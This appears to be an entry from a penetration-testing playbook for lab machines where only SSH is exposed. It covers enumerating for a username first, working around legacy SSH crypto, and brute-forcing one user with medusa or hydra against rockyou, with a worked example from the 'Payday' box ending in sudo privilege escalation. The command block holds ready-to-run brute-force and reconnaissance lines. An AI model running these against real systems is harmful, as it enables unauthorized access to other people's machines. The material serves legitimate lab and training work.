title: SSH Only Exposed
body:
SSH is almost never the FIRST move - it's a door you walk through AFTER information gathering hands you a key or a username. Treat this node as two ordered steps.

STEP 1 - INFO GATHERING (do this first, always). A bare SSH port gives you nothing to brute with. Go find a username or credential elsewhere: check non-standard web ports (something is almost always running), enumerate web apps for LFI / config files / source disclosure, hit SMB and the mail services, read /etc/passwd if you have any file-read. SSH brute force without a username pulled from enumeration is a near-guaranteed dead end - don't start here.

STEP 2 - BRUTE FORCE (only once Step 1 gave you a username). When enumeration hands you a real user (e.g. patrick from an LFI /etc/passwd read), brute that single user against a common wordlist - that's frequently the whole foothold. Two things bite you on old boxes: (1) legacy crypto - modern SSH clients refuse to negotiate the server's old algorithms; fix it once in ~/.ssh/config and every ssh-based tool inherits it. (2) hydra's bundled libssh often CAN'T negotiate legacy crypto at all - it dies with 'kex error: no match for method mac' and no flag fixes it. medusa speaks old SSH where hydra can't - switch tools, don't fight flags.

Worked example (Payday): nmap showed only SSH plus a web app -> enumerated the web app -> CS-Cart LFI leaked the username patrick -> THEN brute: hydra failed on the MAC negotiation, medusa cracked patrick:patrick -> sudo -l revealed passwordless sudo -> root. The brute force only worked because info gathering produced the username first.
cmd:
# ── First: is SSH really the only thing? ──
nmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $ip   # non-standard web
ssh-audit $ip                                          # version / algo audit
nc -nv $ip 22                                          # banner grab

# ══════════════════════════════════════════════════
# LEGACY CRYPTO FIX (old SSH daemons — kex/mac/host-key errors)
# ══════════════════════════════════════════════════
# Error looks like:
#   Unable to negotiate ... no matching host key type found. Their offer: ssh-rsa,ssh-dss
#   kex error : no match for method mac algo ... server [hmac-md5,hmac-sha1,...]
# Set the legacy algorithms once; every ssh-based tool inherits this:
cat >> ~/.ssh/config << 'EOF'

Host <TARGET_IP>
    HostKeyAlgorithms +ssh-rsa,ssh-dss
    PubkeyAcceptedKeyTypes +ssh-rsa
    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
    MACs +hmac-sha1,hmac-md5
    Ciphers +aes256-cbc,aes128-cbc,3des-cbc
EOF

# Verify a manual connect negotiates (a password prompt = crypto works):
ssh patrick@$ip
# One-shot without editing config (note the SPACE after -o, + appends to defaults):
ssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group14-sha1 \
    -o MACs=+hmac-sha1,hmac-md5 -o Ciphers=+aes256-cbc patrick@$ip
# Diagnose which algo is failing:
ssh -v patrick@$ip 2>&1 | grep -iE 'kex|cipher|host key|mac'

# ══════════════════════════════════════════════════
# BRUTE FORCE  <-- ONLY after info gathering gave you a username.
#                  No username = go back and enumerate, do not brute blind.
# ==================================================
# ══════════════════════════════════════════════════
# medusa — negotiates legacy crypto well; the one that works on old boxes:
medusa -h $ip -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
#   -h host  -u user  -P passlist  -M ssh  -t threads (keep low, old sshd drops conns)

# hydra — fine on MODERN ssh; will die on legacy-crypto boxes (libssh can't negotiate):
hydra -l patrick -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4
#   if you see 'kex error: no match for method mac' -> hydra can't do this box, use medusa

# Lab passwords usually sit high in rockyou — try the top slice first for speed:
head -10000 /usr/share/wordlists/rockyou.txt > top.txt
medusa -h $ip -u patrick -P top.txt -M ssh -t 4

# ══════════════════════════════════════════════════
# AFTER YOU'RE IN — first move every time
# ══════════════════════════════════════════════════
sudo -l        # sudo misconfig is a top Linux privesc path (it was the root path on Payday)
id; whoami; hostname
warn: Brute forcing SSH without a targeted username is almost never the path — get a username from enumeration first (LFI, web, config). If hydra throws 'kex error: no match for method mac', that's libssh refusing legacy crypto — no hydra flag fixes it, switch to medusa. Keep brute threads low (-t 4); old SSH daemons drop connections under load and throw false negatives.

choices.label: No username yet — enumerate web/services FIRST
Have creds (found or brute-cracked) — SSH in & privesc
